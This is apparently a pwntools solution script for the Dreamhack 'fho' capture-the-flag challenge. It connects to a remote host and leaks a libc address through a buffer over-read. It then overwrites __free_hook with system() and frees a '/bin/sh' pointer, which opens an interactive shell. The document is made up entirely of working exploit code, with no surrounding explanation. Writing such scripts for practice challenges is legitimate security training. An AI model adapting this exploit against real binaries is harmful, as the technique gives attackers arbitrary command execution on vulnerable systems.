from pwn import *

REMOTE = True

if REMOTE:
    r = remote('host1.dreamhack.games', 8949)
    libcstartmain_offset = 0x21b10
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a
    freehook_offset = 0x3ed8e8
else:
    r = process('./release/fho')
    libcstartmain_offset = 0x21ba0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
    freehook_offset = 0x3ed8e8


# leak libc

r.sendafter('Buf: ', 'a' * 0x48)
r.recvuntil('Buf: ' + 'a' * 0x48)
libcstartmain = u64(r.recvn(6).ljust(8, b'\x00')) - 231  # __libc_start_main()
libc = libcstartmain - libcstartmain_offset
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with system()

r.sendlineafter('To write: ', str(freehook))
r.sendlineafter('With: ', str(system))


# call free("/bin/sh")

r.sendlineafter('To free: ', str(binsh))


r.interactive()